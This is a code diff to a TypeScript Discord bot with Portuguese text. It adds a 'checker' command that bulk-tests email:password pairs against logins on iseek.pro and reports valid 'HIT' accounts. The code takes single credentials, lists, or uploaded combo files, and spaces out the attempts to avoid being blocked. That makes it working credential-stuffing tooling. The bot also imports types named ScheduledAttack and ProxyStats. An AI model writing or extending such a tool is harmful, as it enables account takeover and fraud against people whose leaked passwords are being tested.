@@ -27,7 +27,7 @@ type MonitorEditFn = (opts: {
   components: ActionRowBuilder<MessageActionRowComponentBuilder>[];
 }) => Promise<unknown>;
 import { BOT_TOKEN, APPLICATION_ID, ALL_GUILD_IDS, COLORS, AUTHOR, BOT_NAME, API_BASE } from "./config.js";
-import { api, type ScheduledAttack, type AiAdvice, type ProxyStats, type DbRecord, type QueryResult, type QueryStats } from "./api.js";
+import { api, type ScheduledAttack, type AiAdvice, type ProxyStats, type DbRecord, type QueryResult, type QueryStats, type CheckerItem, type CheckerResponse } from "./api.js";
 import {
   getLogChannelId, setLogChannelId,
   isOwner, isMod,
@@ -534,6 +534,43 @@ const COMMANDS = [
       sub.setName("remove")
         .setDescription("➖ Remover owner ou admin — owner only")
         .addUserOption(opt => opt.setName("user").setDescription("Usuário a remover").setRequired(true))
+    ),
+
+  new SlashCommandBuilder()
+    .setName("checker")
+    .setDescription("🔑 Checker de credenciais — testa logins no iseek.pro")
+    .addSubcommand(sub =>
+      sub.setName("single")
+        .setDescription("🔑 Verificar uma credencial")
+        .addStringOption(opt =>
+          opt.setName("email")
+            .setDescription("E-mail para testar")
+            .setRequired(true)
+        )
+        .addStringOption(opt =>
+          opt.setName("senha")
+            .setDescription("Senha para testar")
+            .setRequired(true)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("multi")
+        .setDescription("📋 Verificar múltiplas credenciais (formato: email:senha,email2:senha2 — máx 10)")
+        .addStringOption(opt =>
+          opt.setName("lista")
+            .setDescription("Credenciais separadas por vírgula ou ponto-e-vírgula: email:senha,email2:senha2")
+            .setRequired(true)
+            .setMaxLength(2000)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("arquivo")
+        .setDescription("📁 Enviar arquivo .txt com credenciais (uma por linha: email:senha) — máx 50")
+        .addAttachmentOption(opt =>
+          opt.setName("arquivo")
+            .setDescription("Arquivo .txt com email:senha por linha")
+            .setRequired(true)
+        )
     ),
 
   new SlashCommandBuilder()
@@ -3724,6 +3761,126 @@ async function handleAdmin(interaction: ChatInputCommandInteraction): Promise<vo
   }
 }
 
+// ── Checker ───────────────────────────────────────────────────────────────────
+async function handleChecker(interaction: ChatInputCommandInteraction): Promise<void> {
+  const callerId = interaction.user.id;
+  const callerName = interaction.user.username;
+  if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
+    await interaction.reply({
+      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas owners e admins podem usar o checker.\n\n*"O Geass não é dado a quem não tem força para carregá-lo."*`)],
+      flags: MessageFlags.Ephemeral,
+    });
+    return;
+  }
+
+  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+  const sub = interaction.options.getSubcommand();
+
+  // ── Resolve credentials ────────────────────────────────────────────────────
+  let credentials: string[] = [];
+
+  if (sub === "single") {
+    const email = interaction.options.getString("email", true).trim();
+    const senha = interaction.options.getString("senha", true).trim();
+    credentials = [`${email}:${senha}`];
+  } else if (sub === "multi") {
+    const lista = interaction.options.getString("lista", true);
+    credentials = lista.split(/[,;\n]+/).map(s => s.trim()).filter(Boolean).slice(0, 10);
+  } else if (sub === "arquivo") {
+    const att = interaction.options.getAttachment("arquivo", true);
+    if (!att.contentType?.includes("text") && !att.name.endsWith(".txt")) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("FORMATO INVÁLIDO", "Envie um arquivo `.txt` com uma credencial por linha no formato `email:senha`.")] });
+      return;
+    }
+    if (att.size > 512_000) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("ARQUIVO MUITO GRANDE", "Limite: 512 KB por arquivo.")] });
+      return;
+    }
+    try {
+      const text = await fetch(att.url).then(r => r.text());
+      credentials = text.split(/\r?\n/).map(s => s.trim()).filter(Boolean).slice(0, 50);
+    } catch {
+      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Não foi possível baixar o arquivo. Tente novamente.")] });
+      return;
+    }
+  }
+
+  if (credentials.length === 0) {
+    await interaction.editReply({ embeds: [buildErrorEmbed("SEM CREDENCIAIS", "Nenhuma credencial válida encontrada.")] });
+    return;
+  }
+
+  // ── Status message while checking ─────────────────────────────────────────
+  const estimateSecs = credentials.length * 17;
+  await interaction.editReply({
+    embeds: [new EmbedBuilder()
+      .setColor(COLORS.GOLD ?? 0xF1C40F)
+      .setTitle("⏳ CHECKER — VERIFICANDO...")
+      .setDescription(
+        `Testando **${credentials.length}** credencial${credentials.length === 1 ? "" : "s"} no **iseek.pro**\n\n` +
+        `⏱️ Tempo estimado: ~${estimateSecs}s\n` +
+        `*(Uma por uma, com intervalo de 1.5s para evitar bloqueio)*`,
+      )
+      .setFooter({ text: AUTHOR })],
+  });
+
+  // ── Call API ───────────────────────────────────────────────────────────────
+  let resp: CheckerResponse;
+  try {
+    resp = await api.checkerBulk(credentials);
+  } catch (err) {
+    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha ao comunicar com a API:\n\`${String(err)}\``)] });
+    return;
+  }
+
+  // ── Format results ─────────────────────────────────────────────────────────
+  const statusEmoji = (s: CheckerItem["status"]): string =>
+    s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
+
+  const lines = resp.results.map(r => {
+    const icon    = statusEmoji(r.status);
+    const detail  = r.detail.length > 60 ? r.detail.slice(0, 57) + "..." : r.detail;
+    return `${icon} \`${r.credential}\`\n> ${detail}`;
+  });
+
+  // Split into chunks (Discord embed description max 4096)
+  const chunks: string[][] = [[]];
+  for (const line of lines) {
+    const cur = chunks[chunks.length - 1];
+    const curLen = cur.join("\n\n").length;
+    if (curLen + line.length + 2 > 3800) chunks.push([line]);
+    else cur.push(line);
+  }
+
+  const embeds: EmbedBuilder[] = chunks.map((chunk, i) => {
+    const isFirst = i === 0;
+    return new EmbedBuilder()
+      .setColor(resp.hits > 0 ? COLORS.GREEN : resp.errors === resp.total ? COLORS.ORANGE : COLORS.RED)
+      .setTitle(isFirst ? "🔑 CHECKER — RESULTADOS" : `🔑 CHECKER — RESULTADOS (${i + 1})`)
+      .setDescription(isFirst
+        ? `📊 **${resp.total}** testada${resp.total === 1 ? "" : "s"} — ✅ **${resp.hits} HIT** | ❌ **${resp.fails} FAIL** | ⚠️ **${resp.errors} ERRO**\n\n` +
+          chunk.join("\n\n")
+        : chunk.join("\n\n"),
+      )
+      .setTimestamp(isFirst ? new Date() : null)
+      .setFooter(isFirst ? { text: `${AUTHOR} • iseek.pro checker` } : null);
+  });
+
+  // If there are HITs, also send a clean hits-only summary at the end
+  const hits = resp.results.filter(r => r.status === "HIT");
+  if (hits.length > 0) {
+    const hitsText = hits.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n");
+    embeds.push(new EmbedBuilder()
+      .setColor(COLORS.GREEN)
+      .setTitle(`✅ HITS CONFIRMADOS (${hits.length})`)
+      .setDescription(hitsText.slice(0, 4000))
+      .setFooter({ text: `${AUTHOR} • ${hits.length} conta${hits.length === 1 ? "" : "s"} válida${hits.length === 1 ? "" : "s"}` }),
+    );
+  }
+
+  await interaction.editReply({ embeds: embeds.slice(0, 10) });
+}
+
 // ── Consulta ─────────────────────────────────────────────────────────────────
 async function handleConsulta(interaction: ChatInputCommandInteraction): Promise<void> {
   await interaction.deferReply({ flags: MessageFlags.Ephemeral });
@@ -3974,6 +4131,8 @@ async function main(): Promise<void> {
         await handlePanel(interaction);
       } else if (commandName === "admins") {
         await handleAdmins(interaction);
+      } else if (commandName === "checker") {
+        await handleChecker(interaction);
       } else if (commandName === "consulta") {
         await handleConsulta(interaction);
       }
